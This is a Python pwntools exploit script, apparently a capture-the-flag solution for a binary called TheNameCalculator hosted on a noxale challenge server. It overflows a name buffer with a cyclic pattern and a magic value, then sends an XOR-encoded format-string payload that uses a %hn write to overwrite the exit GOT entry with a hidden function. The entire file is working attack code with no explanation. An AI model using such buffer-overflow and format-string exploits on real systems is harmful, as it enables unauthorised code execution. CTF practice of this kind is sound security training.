#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import roputils as rp
import os
import sys

elfPath = "./TheNameCalculator"
libcPath = ""
remoteAddr = "chal.noxale.com"
remotePort = 5678

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
        context.log_level = "info"
    if libcPath:
        libc = ELF(libcPath)

#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

def encrypt(p):
    payload = ""
    payload += chr(ord(p[0]) ^ 0x53)
    payload += chr(ord(p[1]) ^ 0x53 ^ 0x41)
    payload += chr(ord(p[2]) ^ 0x53 ^ 0x41 ^ 0x7B)
    payload += ''.join([chr(ord(i) ^ 0x5F ^ 0x7B ^ 0x41 ^ 0x53) for i in p[3: -4]])
    payload += chr(ord(p[-4]) ^ 0x5F ^ 0x7B ^ 0x41)
    payload += chr(ord(p[-3]) ^ 0x5F ^ 0x7B)
    payload += chr(ord(p[-2]) ^ 0x5F)
    payload += p[-1]
    print len(payload)
    assert len(payload) <= 27

    return payload

if __name__ == "__main__":
    name = cyclic(28) + p32(0x6A4B825)
    io.sendafter("?\n", name)

    #  DEBUG([0x8048690, 0x80486A9])
    #  DEBUG([0x80486D5])

    buf = p32(elf.sym['retAddr']) + p32(elf.got['exit']) + "%{}c%{}$hn".format((elf.sym['superSecretFunc'] & 0xffff) - 8, 13)
    #  buf += "%12$hn"
    print hexdump(buf)
    io.sendafter("please\n", encrypt(buf))
    
    io.interactive()
